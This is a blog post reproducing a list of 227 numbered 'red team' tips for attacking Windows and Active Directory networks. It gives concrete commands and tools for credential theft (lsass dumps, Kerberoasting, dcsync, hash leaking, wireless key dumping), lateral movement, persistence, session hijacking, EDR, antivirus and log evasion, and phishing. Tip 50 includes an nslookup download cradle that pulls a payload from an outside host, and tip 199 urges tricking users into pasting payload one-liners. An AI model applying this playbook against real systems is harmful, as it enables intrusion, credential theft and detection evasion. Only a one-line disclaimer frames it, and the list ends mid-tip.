---
title: "Red Team Tips"
category: TIP
layout: post
---

[**`Original vysec github`**](https://github.com/vysec/RedTips/)

# Red Team Tips

* 1: Profile your victim and use their user agent to mask your traffic. Alternatively use UA from software such as Outlook.

* 2: If the enemy SOC is using proxy logs for analysis. Guess what? It wont log cookies or POST body content as can be sensitive.

* 3: Taking a snapshot of AD can let you browse, explore and formulate future attacks if access is lost momentarily.

* 4: consider using Office Template macros and replacing normal.dot  for persistence in VDI environments.

* 5: Do a DNS lookup for terms such as intranet, sharepoint, wiki, nessus, cyberark and many others to start intel on your target.

* 6: Got access but need to find target? Use WMIC to query and dump the DNS Zone for a better view of assets - https://serverfault.com/questions/550385/export-all-hosts-from-dns-manager-using-powershell

* 7: Whether PSEXEC, WMI, PS remoting or even the recent COM execution technique for lateral movement. Dont forget beloved RDP.

* 8: Make sure theres trackers in your: emails, delivery server and payload execution. Any more? Comment to share!

* 9: When PowerUp yields no results, dont forget SysInternalss AutoRuns. Often you can find unexpected surprises :)

* 10: When using BloodHound, dont forget DA equivalents such as administrators and server operators etc too. These arent mapped.

* 11: When navigating mature environments, a good old network diagram along with AD OUs can help to shed some light into next steps.

* 12: Kerberoast them hashes, could be a fast route to domain administrator. PowerView: Invoke-Kerberoast -Format Hashcat

* 13: Shared local administrator account hashes are great for lateral movement. Find machines based on the same build and attack away

* 14: Got extra credentials? Use different sets for separate egress channels so that if one account is disabled all the rest are ok.

* 15: You dont need payloads when you can phish credentials and login to Citrix, VPN, email with no 2FA. Check the perimeter.

* 16: @dafthack MailSniper, @domchell LyncSniper can be a useful but noisy way to obtain AD credentials into an organisation.

* 17: @_staaldraad Ruler tool can be used to obtain code execution on a system running Outlook if you can access exchange externally

* 18: When tools like MailSniper dont work in custom environments, you still have good old @Burp_Suite to replicate the attacks

* 19: Need a DC? echo %LOGONSERVER%. Need a list? nltest /dclist, nslookup -q=srv _kerberos._tcp (domain suffix can autocomplete)

* 20: So apparently not many people use SSH for redirector setup. So try out SSH c2 -R *:80:localhost:80. SSH config GatewayPorts yes

* 21: Found open user home shares that are accessible? See if you can drop into Startup Programs for lateral movement and privesc.

* 22: Use VNC, microphone and webcam to perform surveillance. Netstat, tasklist can provide context into what the users doing.

* 23: Stash payloads in C:\$Recycle.Bin

* 24: Compromise the SOC and Security teams to watch their progress and track their email alerts for sophisticated threats

* 25: Probably dont do this on a red team, but spray for Welcome1, Password1 if youre struggling to move. But move off fast.

* 26: Split your campaigns up so that they are independent. Fire tons at once for decoys and to burn out the defence.

* 27: Need more credentials? Search for passwords on Sharepoint, and intranet.

* 28: Look for asset registers to understand who owns what machine, make and model. Theres usually an asset label to host name too!

* 29: Lateral movement: printers, open webroots, good old Tomcat, what are your quick wins?

* 30: Get AD credentials? Turn up on site and you might be able to use them to login to Corporate Wifi :)

* 31: Hunting e-mails and network shares for penetration testing reports can often yield good results.

* 32: List mounts: net use, look for shared folders and drop a UNC icon LNK into it. Run Inveigh or Wireshark on host to grab hashes.

* 33: Orgs are transitioning to cloud services such as AWS, Beanstalk, O365, Google Apps. 2FA is vital - password reset to compromise.

* 34: OpSec. Set notifications to your phone for logins or intrusion attempts in any part of your attack infrastructure.

* 35: FireEye sandbox flagging your payloads? Try anti sandbox techniques! If not, just use HTA to get into memory as it doesnt scan

* 36: Dont forget the good old GPP passwords in SYSVOL. There may be cached GPP on the machine. Applying the patch isnt enough

* 37: Use GenHTA to generate HTA files that use anti-sandboxing techniques. https://github.com/vysec/GenHTA

* 38: Having trouble getting @armitagehacker CobaltStrikes evil.hta through defenses? https://github.com/vysec/MorphHTA

* 39: If emails get bounced, read the email! Sometimes due to malware scanners, spam etc. Or you may even get an out of office reply.

* 40: @0x09AL suggests looking for default credentials on printers and embedded devices. Move off initial foothold using this.

* 41: @Oddvarmoe suggests using Alternate Data Streams if you need to put a file on disk. For example https://github.com/samratashok/nishang/blob/master/Backdoors/Invoke-ADSBackdoor.ps1

* 42: Got OS level access to a middle tier? Task list, netstat and wmic process list full | findstr /I commandline for more ideas!

* 43: So you know where the server application files are. Download the binaries and check out configuration files for conn. strings

* 44: Run PEiD and other packer / technology checkers to find out the language and packer used on downloaded server binaries.

* 45: Run strings on the application binary for potentially other cleartext sensitive strings! (Unicode mode too)

* 46: On a VDI? Check out C:\ and other disks for potentially sensitive files other users may have saved there.

* 47: Incase EDR are looking for "net users /domain" try using "net use /dom"

* 48: Is EDR potentially looking for "powershell -encodedcommand"? Try "powershell -ec"

* 49: Attacking a heavy Macintosh or Linux estate? Send a Office Maldoc with OS checking logic to obtain footholds on either system

* 50: Carbon Black checks for IEX and web req commands. Use powershell "powershell . (nslookup -q=txt calc.vincentyiu.co.uk )[-1]"

* 51: Cant open C drive? Try \\127.0.0.1\c$

* 52: SC doesnt take credentials. Cant use runas? Try net use \\targetip\ipc$ password /u:domain\username then sc to psexec

* 53: When stick phishing for 2FA, consider using @mrgretzky Evilginx project which logs cookies. https://breakdev.org/evilginx-1-1-release/

* 54: Hide from blue. Volume shadow copy then execute \\?\GLOBALROOT\Device\HarddiskVolumeShadowColy1\malware.exe/dll then delete VSC

* 55: SMB hash leaking using a UNC path for image in page for drive by leak can give you credentials for less mature environments.

* 56: Target victims using email authentication such as Microsoft Account on Windows 10? Hash leak exposes full email address!

* 57: Working in teams yields better results; and best of all Makes Offensive operations more fun and keeps the adrenaline pumping

* 58: Discuss business targets and objectives with your clients. This process should set non technical goals such as "ATM spit money"

* 59: Checking whether a server or host is good for egress? Likely to go down? "systeminfo | findstr /i boot"

* 60: Type "query user" to see who else is connected to the machine.

* 61: Get a quick patch list using wmic qfe list brief. Cross ref KB to bulletins.

* 62: Found a process of interest? Dont forget to obtain a MiniDump! Use Out-MiniDump https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Out-Minidump.ps1

* 63: Finally in CyberArk, click policies and see safes but no account? Go to accounts search and search for empty and safes show up

* 64: Is WebDav allowed through the gateway? Using http mini redirector? Dont exfiltrate or send in files. WebDav is subject to DLP

* 65: WebDav mini http redirector: net use * http://totallylegit.com/share . Then start z:

* 66: Found potential MQ creds? ActiveMQ? Try out https://github.com/fmtn/a , works to query MQ endpoints that dont use self signed crt

* 67: Use vssadmin to list and create volume shadow copies

* 68: Pivoting into a secure zone that has no DNS or web gateway and need exfil? Netsh port forward pivot UDP 53 to DNS 53 then boom

* 69: Have blue hidden the ways including winkey+R? Try shift and right click desktop and open command prompt

* 70: Tracked down that putty session? Popped the box? Query user and check the victims logon time and idle times

* 71: Hijack his Session using sc create sesshijack binpath= "cmd.exe /k tscon <ID> /dest:<SESSIONNAME>" then use putty session

* 72: Most people understand email sec wrong. SPF does not mean not spoofable. SPF does nothing without DMARC.

* 73: Weak DMARC on victim org domain? Spoof their own emails back into themselves! You even inherit their AD name and photo

* 74: Got access to Microsoft OWA mailbox or O365? You can extract global catalog from contacts use @Burp_Suite and parse JSON object

* 75: Write PHP delivery scripts that can mutate your payloads and add unique trackers per download. This tracks file being executed

* 76: Simulating a criminal threat story with smash and grab agenda? Phish users and hot swap payload mid campaign to test formats

* 77: RCE on a web application for less mature client? nslookup -q=srv _ldap._tcp if its domain joined Invoke-Kerberoast

* 78: @benichmt1 suggests looking for vmdk files across the network. You can use this to potentially access segregated networks

* 79: Obfuscation is never bad, especially when its a button click. @danielhbohannon - https://github.com/danielbohannon

* 80: Need to sweep for uptimes? Use wmic /node:"<computer>" OS get LastBootUpTime in a for loop

* 81: Looking for systems running KeePass? Run a for loop on wmic /node:"host" process list brief :) then look at RT #82

* 82: Found KeePass running in memory? Use @harmj0y KeeThief to extract password and dl the KDBX - https://github.com/HarmJ0y/KeeThief

* 83: Struggling to find a working DB client? Live off the land and use your victims in an RDP session.

* 84: Im sure everyone hates Oracle DB but no sweat, you can proxycap sqldeveloper.exe

* 85: Check the users calendars before using persistence on their machine. They may be out of office and screw your master plans.

* 86: Red team and attack simulation is not penetration testing. You shouldnt be really testing anything, but simply infiltrating.

* 87: @Oddvarmoe uses .UDL files to quickly launch a MSSQL connection test to validate credentials! https://blogs.msdn.microsoft.com/farukcelik/2007/12/31/basics-first-udl-test/

* 88: Dont forget Physical security! Whip up a PI with GSM and you can hack your way in by dropping the PI on network.

* 89: regsvr32 SCT files are being detected as Squigglydoo. Looks for "script" case sensitive and "<registration" case insensitive.

* 90: Cisco NGIPS is shit, when analysing traffic for havex it drops only <havexhavex> but not <havexDATABLOBhavex>

* 91: Decoys can be as simple as burning egress by port scanning 1-1024 through IDS, or spamming dodgy emails at blocks of employees

* 92: If WDigest is disabled, reenable it for cleartext credentials before new users login with @harmj0y https://github.com/HarmJ0y/Misc-PowerShell/blob/master/Invoke-WdigestDowngrade.ps1

* 93: Use Empyre to generate Macintosh and Linux payloads, modify it to contain code for Windows too! https://github.com/EmpireProject/EmPyre

* 94: Client uses VDIs? Compromise underlying host and use Citrix Shadow Taskbar to spy on VDI sessions by selecting username

* 95: @domchell recommends avoiding non persistent VDIs and persist on laptops. Query DC for live laptops.

* 96: @lucasgates recommends using OLE objects containing VBS scripts instead of Macros as less suspicious. VBE will work too

* 97: Use recent critical vulnerabilities such as CVE-2017-0199 HTA handler issue to simulate real threats. https://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/

* 98: @0x09AL suggests WordSteal. You can embed an IMAGE with UNC path to steal hashes from Word. Wont work if proxy. https://github.com/0x09AL/WordSteal

* 99: If client is using Proxy with WebDav you can phish creds using @ryHanson Phishery https://github.com/ryhanson/phishery

* 100: Use wgsidav if you need a quick WebDav server :) https://github.com/mar10/wsgidav

* 101: Set up red team infrastructure following @bluscreenofjeff guidelines! https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki

* 102: Easier DNS redirector! https://pastebin.com/LNj4zjFs  for opsec and not hosting C2 on the cloud

* 103: Red team tips are useful but what makes the good red teamer is experience. Rack up that breadth of experience

* 104: SessionGopher does a decent job at retrieving putty and RDP history - https://github.com/fireeye/SessionGopher

* 105: If ping 8.8.8.8 works, try ICMP tunnelling. More info at http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html?m=1 from @fragsh3ll though only on immature network

* 106: Wordlists? https://github.com/berzerk0/Probable-WordlistsI like to use the top probable 297 million list with Deadhobo rules

* 107: More of a pentest tip but nslookup http://google.com  if it resolves you may have a DNS tunnelling problem.

* 108: Post exploitation Asset Discovery https://github.com/vysec/Invoke-DNSDiscovery looks for assets by name that might be good if youre low priv user.

* 109: Use Invoke-ProcessScan to give some running processes context on a system. This uses EQGRP leaked list- https://github.com/vysec/Invoke-ProcessScan

* 110: Mature blue? Be careful and minidump lssas.exe then download it and parse locally

* 111: Found an exploitable S4U condition? Use Mistique to attack! https://github.com/machosec/Mystique/blob/master/Mystique.ps1

* 112: Need to use VNC as RDP in use? https://github.com/artkond/Invoke-Vnc has been pretty stable for me. Run it then pivot in and connect!

* 113: Found super secret.doc or master password database.xlsx? Use office2john to get hash and crack in Hashcat!

* 114: PowerUp didnt work and you want to autoruns? Dont bother going on disk, use Invoke-AutoRuns to csv- https://github.com/p0w3rsh3ll/AutoRuns

* 115: Need to zip up a directory quickly for easy exfiltration? Eg. Home shares https://github.com/thoemmi/7Zip4Powershell use Powershell

* 116: Use CatMyFish to search for categorised domains that could be used in your engagements - https://github.com/Mr-Un1k0d3r/CatMyFish

* 117: Ran Invoke-MapDomainTrusts from PowerView? Use @harmj0y DomainTrustExplorer to generate a graph - https://github.com/sixdub/DomainTrustExplorer

* 118: FOCA finds some useful information for OSINT and intelligence phases. https://www.elevenpaths.com/labstools/foca/index.html

* 119: GoPhish is a pretty useful tool for spinning up simple phishing campaigns especially for decoys https://getgophish.com

* 120: If you have write access to the orgs shared Office template folders You can privesc by backdooring these trusted documents.

* 121: @zwned uses netsh packet tracing to sniff natively from victim host. Save capture and analyze offline!

* 122: More decoy tips! Scan the external perimeter with tools like Nessus and OpenVAS. More traffic the better just to burn the blue

* 123: Read Sean Metcalfa blog http://adsecurity.org/  When AD is used in many environments, it vital to at least know techniques

* 124: Remember you can generate a golden ticket offline with knowledge of krbtgt and rest offline. Golden ticket gets silver from DC

* 125: Got krbtgt of a child domain? Forest parent trusts you? Use the SID history attack in golden tickets to escalate to Ent Admin

* 126: You dont necessarily need Domain Admin, if you have an account that has "Replicating directory changes", dcsync to pull hash

* 127: Planning to use secretsdump.py? :) Try using the DC machine account to authenticate and dump instead of a user! Save hash

* 128: Use machine account hashes to generate silver tickets to a host for persistence. Save machine hash for DC incase krbtgt rotate

* 129: Use PEAS to query shares and emails if using ActiveSync -  https://github.com/mwrlabs/peas

* 130: (Not red really but useful) Sort IPs: cat IPs.txt | sort -t . -k1,1 -k2,2 -k3,3 -k4,4

* 131: Learn AWK and general bash scripting. Processing and merging of data sets speeds up our job for discovery and time keeping.

* 132: Worth learning to pick locks and the dust can sensor trick if youre going to do some physical. http://www.artofmanliness.com/2014/11/19/how-to-pick-a-lock-pin-tumbler-locks/

* 133: Grep has an extract flag -o that can be used to extract from a regex. Good for extracting data from massive blobs.

* 134: Victims use wireless? Use KARMA attack to force them onto your network. Use eternalblue, domain creds or other vulns to get in.  https://github.com/sensepost/mana

* 135: Phishing pages are usually custom. However its always good to have a stash for decoys. Generic Gmail, Office365?

* 136: Keep up to date by watching presentations from conferences on YouTube :) Discover useful techniques

* 137: If youve exhausted all payload types, try sending a Mac user a python one liner and Win PS 1 liner. Ive had people run it.

* 139: If you need to get a clean EXE for file drop and exec, try out @midnite_runr Backdoor Factory - https://github.com/secretsquirrel/the-backdoor-factory

* 140: If enemy does not use proxy with TLS inspection then you can use https://www.mdsec.co.uk/2017/02/domain-fronting-via-cloudfront-alternate-domains/ to mask your c2 channel further

* 141: On a Linux box and want to egress from it over a proxy? Use ProxyTunnel to pipe SSH - https://github.com/proxytunnel/proxytunnel

* 142: Need some OSINT? Keep Spiderfoot running long term to accompany your manual OSINT sources http://www.spiderfoot.net

* 143: OSINTing? TheHarvester does a decent job at subdomains. Though theres better ways to get emails bulk. https://github.com/laramies/theHarvester

* 144: Exploring and want to use WMI? https://www.microsoft.com/en-us/download/details.aspx?id=8572 is pretty useful for exploring the different namespaces and classes.

* 145: Need to reset a password? Do it then quickly dcsync for previous password hash and use NTLMinject - https://github.com/vletoux/NTLMInjector

* 146: IDS flagging known payload binary blob? Base64 encode it in your payload and use certutil, PS or VB to decode it!

* 147: Test your phishing campaigns before sending!!!

* 148: If youre sending into Exchange, make sure your SMTP server is not in SPAM list or black lists. Check junk mails mail headers

* 149: Use Microsofts Message Header Analyzer to parse and review email headers from Outlook. https://testconnectivity.microsoft.com/MHA/Pages/mha.aspx

* 150: Make sure phishing emails Bounce header matches From. Or else some will flag as malicious.

* 151: DomainHunter also looks for good candidate expired domains - https://github.com/minisllc/domainhunter

* 152: Want to scrape MetaData in CLI? Use PowerMeta. Linux users can use PowerShell too! https://github.com/dafthack/PowerMeta

* 153: RDP in use? Dont want to use VNC? Try mimikatzs ts::multirdp in memory patch by @gentilkiwi

* 154: Admin on a machine with VPN client? certificate extraction using Mimikatz by @gentilkiwi. Dont forget to dl configs. Backdoor

* 155: Master all the quick wins to Domain privilege escalation. When youre pressured to get DA in 15 mins, you want to know you can

* 156: @Akijos notes that we should be careful when using silver tickets with scheduled tasks. Author is the user account youre on.

* 157: If you dont need a golden ticket, dont generate it.

* 158: Scan a DNS server for Alexa top 1 million spoofable domains :) Ive got a massive list, do you?

* 159: Scan the internet for a list of domain frontable domains! Ive got a big big list ready for whenever I want to use them :)

* 160: We all know people share credentials between different services. Try these credentials on other accounts owned by the user!

* 161: Cant crack a password? Try the users previous passwords from history in AD. They may follow a pattern.

* 162: Cant crack a hash owned by a user? Take all previously discovered passwords from their files and generate a new word list.

* 163: Cant crack a password? Make sure these are in your word list: name of company, town, capital, country, months! Appear a lot.

* 164: Didier Stevens has SelectMyParent tool that lets you spawn a child process with an arbitrary parent. https://blog.didierstevens.com/2017/03/20/that-is-not-my-child-process/

* 165: Using SelectMyParent stops those detections eg. powershell.exe spawning cmd.exe. @armitagehackers CobaltStrike has ppid cmd!

* 166: Use PowerPoint mouse over text to invoke a powershell command one liner. #adversarysimulation - https://www.dodgethissecurity.com/2017/06/02/new-powerpoint-mouseover-based-downloader-analysis-results/

* 167: Follow @mattifestation to keep up to date with blue team advances. Just in case blue is actually up to date with mitigations!

* 168: Using VBS or JS? Cant stage using PowerShell.exe as blocked? @Cneelis released https://github.com/Cn33liz/StarFighters so you can keep use PS

* 169: Not sure who uses Wi-Fi webcams but go run a mass deauth attack if youre going to plan on breaking in physically to discon

* 170: @malcomvetter Never use defaults - run Mimikatz with AES and 8 hour tickets to avoid passive detection from NG defense tools!

* 171: Win XP doesnt have PowerShell? Try using Unmanaged powershell to keep using your favourite scripts!

* 172: @anthonykasza tells us that the at.exe command takes base64 encoded Params! Eg. at.exe b64::[encoded params]

* 173: Grab cleartext wireless keys: netsh wlan show profile name="ssid" key=clear

* 174: Got a shell on a victim without admin? Want their creds? Try Inveigh then rpcping -s 127.0.0.1 -t ncacn_np to leak hash.

* 175: Got a low priv shell and need creds? Use Invoke-LoginPrompt by @enigma0x3 https://raw.githubusercontent.com/enigma0x3/Invoke-LoginPrompt/master/Invoke-LoginPrompt.ps1

* 176: Get access to shadow admin accounts, they can DCsync and are essentially DA. https://www.cyberark.com/threat-research-blog/shadow-admins-stealthy-accounts-fear/

* 177: If blue detects PTH. Try extract Kerberos tickets and PTT.

* 178: @lefterispan wrote https://gist.github.com/leftp/a3330f13ac55f584239baa68a3bb88f2 … which sets up a proxy and forces an auth attempt to it to leak hash. Low priv leak.

* 179: When creating phishing pages, try cloning and modifying parts of the client’s own webpages. For example of their VPN login!

* 180: Regardless of whether there are known defences. Run your PS scripts through Obfuscation before loading into memory.

* 181: Stuck trying to find those assets still? Try @424f424f Get-BrowserData https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/Get-BrowserData.ps1

* 182: Follow @JohnLaTwC as he tweets phishing examples and sometimes with new techniques used in Wild. Good for adversary simulation

* 183: @MrUn1k0d3r released https://github.com/Mr-Un1k0d3r/SCT-obfuscator … can probably bypass Gateway signatures when performing SCT delivery for regsvr32! https://github.com/Mr-Un1k0d3r/SCT-obfuscator

* 184: We always talk about Windows and AD. But now let’s have a look at Linux and AD with https://medium.com/@br4nsh/from-linux-to-ad-10efb529fae9

* 185: Use WSUS for lateral movement https://github.com/AlsidOfficial/WSUSpendu/blob/master/WSUSpendu.ps1

* 186: View @jpcert https://www.jpcert.or.jp/english/pub/sr/20170612ac-ir_research_en.pdf … and look at all those indicators and artefacts left behind. Then hexedit those tools 👍

* 187: Found a portal using 2FA? Using RSA SecureID? https://blog.netspi.com/targeting-rsa-emergency-access-tokencodes-fun-profit/ … Pin bruteforce!

* 188: @pwnagelabs says to avoid bash history on exit using: kill -9 $$

* 189: @pwnagelabs teaches us how to avoid wtmp logging with: ssh -l user target -T

* 190: @bluscreenofjeff shows us how to use Apache Mod rewrite to randomly serve different payloads https://bluescreenofjeff.com/2017-06-13-serving-random-payloads-with-apache-mod_rewrite/

* 191: Domain user? Query LDAP for Printers. Attempt default creds or known vulns then read Service account creds, hash or relay

* 192: Get-WmiObject -Class MicrosoftDNS_AType -NameSpace Root\MicrosoftDNS -ComputerName DC001 | Export-CSV -not dns.csv

* 193: Password protected doc in email? For some reason a lot of people send the password separately to the same inbox. #epicfail

* 194: Can’t see another part of the network and there’s a DC? Pivot off the DC :)

* 195: C:\windows\system32\inetsrv\appcmd list site to find IIS bindings.

* 196: DA -> Locate DB -> Found MSSQL? https://github.com/NetSPI/PowerUpSQL use PowerUpSQL to enumerate and privesc by stealing tokens.

* 197: If ACL doesn’t let you read other users’ home shares, you can try net view \\fileserv /all to try other shares and folders!

* 198: Username jondoe and jondoe-x? Ones an Admin? Try same password. May be shared 😎 repeat for entire user list.

* 199: Failed to phish? Payloads failing? Mac users? Write an email and ask them to open terminal and paste in python Empyre one line

* 200: @_wald0 blessed us with this BH cypher query to skip specific nodes to look for other paths. https://pastebin.com/qAzH9uji

* 201: @424f424f pushed some research into LNK files inside CAB can be used to bypass the Attachment Manager 👍http://www.rvrsh3ll.net/blog/informational/bypassing-windows-attachment-manager/

* 202: When domain fronting, your calls hit the edge node, so every domain you use potentially hits a different a IP! 😎

* 203: If using @Cneelis StarFighter. Instead of using a staged web delivery, just stick while stageless payload as encoded block in!

* 204: Printers are often good MAC addresses to use to beat NAC when physical red teaming as printers (mostly?) don’t support 802.1x

* 205: If proxy is blocking SCT file, replace <scriptlet> with <package> and add <component id="test"> around the rest. Thx @subTee

* 206: CobaltStrike's @armitagehacker VNC not working? Here's a workaround using @artkond Invoke-VNC https://github.com/vysec/Aggressor-VYSEC/blob/master/vnc-psh.cna

* 207: Got C2 on Windows user but no credentials? Leak a hash using @leftp's code. Implemented into CNA https://github.com/vysec/Aggressor-VYSEC/blob/master/Invoke-CredLeak.ps1

* 208: @Nebulator spoke on IP regex by IR at #SnoopCon. Here's CobaltStrike @armitagehacker CNA to automate https://github.com/vysec/Aggressor-VYSEC/blob/master/ping.cna

* 209: Automate environment prepping and spawn all processes as a child of explorer.exe by @armitagehacker https://github.com/vysec/Aggressor-VYSEC/blob/master/auto-prepenv.cna

* 210: @subTee highlighted to us that XML requests can be used as a download cradle in constrained language mode!

* 211: Check out @armitagehacker's post on OPSEC considerations when using Cobalt Strike's beacon. https://blog.cobaltstrike.com/2017/06/23/opsec-considerations-for-beacon-commands/

* 212: Reset AD passwords from Linux with @mubix https://room362.com/post/2017/reset-ad-user-password-with-linux/ :) proxychains it over your pivot :D

* 213: Got a NetNTLMv1 hash? Convert it to NTLM by cracking three DES keys: https://hashcat.net/forum/thread-5912.html

* 214: If you don’t 100 percent understand NETNTLMv1 and v2 read up on https://blog.smallsec.ca/2016/11/21/ntlm-challenge-response/

* 215: If you don’t know how LM and NTLM hashing works... go back to basics with https://blog.smallsec.ca/2016/11/07/windows-credentials/

* 216: @424f424f just made me aware that FireEye can prevent runas from executing. Use unmanaged PS to spawn https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1

* 217: S4U can be used to delegate across SPN. So if you have msds-allowedtodelagateto HTTP you can exploit to obtain HOST and CIFS

* 218: You’re in a subnet where people RDP into but you can’t attack outwards? Set backdoor over tsclient on start keys. 😎

* 219: Unsure what the localised admin account might be called or need to copy and paste? Check out https://social.technet.microsoft.com/wiki/contents/articles/13813.localized-names-for-administrator-account-in-windows.aspx

* 220: EDR monitoring “whoami”? Use echo %userprofile%; echo %username%. Or replace echo with anything that reflects error: ie. set

* 221: Network segregation in play? Try Get-NetSubnet, Get-NetSite in PowerView or browse in AD explorer. Can help find your way :)

* 222: If you want to simulate MBR activity like #Petya, check out https://github.com/PowerShellMafia/PowerSploit/blob/master/Mayhem/Mayhem.psm1

* 223: Secure your beach heads against #Petya WMIC /node:host process call create “echo > C:\windows\perfc”

* 224: Using Linux? Modify /etc/dhcp/dhclient.conf and remove gethostname() for Opsec when you VPN or have to rock up on site.

* 225: Stuck in a heavily segregated situation on a server? Try RDPInception attack vector out https://www.mdsec.co.uk/2017/06/rdpinception/

* 226: Reduce AV detection by using fake Microsoft certificate.

* 227: Not using notifications yet for C2 events? For @armitagehacker's Cobalt Strike check out

## Disclaimer
> The following information should not be used for malicious purposes or intent